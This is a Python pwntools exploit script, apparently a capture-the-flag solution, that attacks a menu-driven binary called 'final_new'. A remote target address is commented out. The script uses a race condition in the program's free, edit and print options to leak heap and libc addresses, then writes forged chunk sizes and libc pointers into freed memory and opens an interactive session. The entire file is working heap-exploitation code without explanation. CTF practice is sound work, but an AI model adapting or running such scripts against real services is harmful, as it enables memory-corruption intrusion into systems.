#!/usr/bin/python
from pwn import *

#p = remote("185.168.131.14",1337)
p = process("./final_new")
#raw_input()

def menu():
	p.recvuntil(">>")

def create_sha(key,length,plain,desc):
	menu()
	p.sendline("1")
	p.recvuntil("it:")
	p.sendline(str(key))
	p.recvuntil("plaintext:")
	p.sendline(str(length))
	p.recvuntil("plaintext:")
	p.sendline(plain)
	p.recvuntil("feedback:")
	p.sendline(desc)

def print_key(idx,key):
	menu()
	p.sendline("9")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")
	p.sendline(str(key))

def edit_key(idx,key,new_d,new_feed):
	menu()
	p.sendline("8")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")
	p.sendline(str(key))
	p.recvuntil("data:")
	p.sendline(new_d)
	p.recvuntil("feedback:")
	p.sendline(new_feed)

def free_key(idx,key):
	menu()
	p.sendline("7")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")
	p.sendline(str(key))

def race_free_key(idx,key):
	menu()
	p.sendline("7")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")

def race_edit_key(idx,key,new_d,new_feed):
	menu()
	p.sendline("8")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")

def race_print_key(idx):
	menu()
	p.sendline("9")
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("key:")

def reset():
	menu()
	p.sendline("10")


create_sha(222,20,"AAAA","BBBB")
create_sha(223,20,"AAAA","BBBB")
sleep(6)
create_sha(222,20,"AAAA","BBBB")
race_print_key(2)

p.recvuntil("prevented a collision")
p.sendline("0")
p.recvuntil("Feedback: ")
p.recv(8)
heap = u64(p.recv(8)) - 0x260
log.success("Heap: " + hex(heap))

reset()
words = "D"*8
words += p64(heap+0x2b0)
words += p64(0x0)
fake = p64(0xb1)
create_sha(260,40,"CCCC",fake)
sleep(6)
create_sha(260,40,"CCCC",words)
race_free_key(3,260)
p.recvuntil("prevented a collision")
p.sendline("0")

print_key(2,260)
p.recvuntil("Feedback: ")
p.recv(8)
libc = u64(p.recv(8)) - 0x3c4b78
log.success("Libc: " + hex(libc))

fake = p64(0xbf)
fake += p64(libc + 0x3c4b78)
fake += p64(libc + 0x3c4b78)
edit_key(2,260,"VV",fake)

p.interactive()
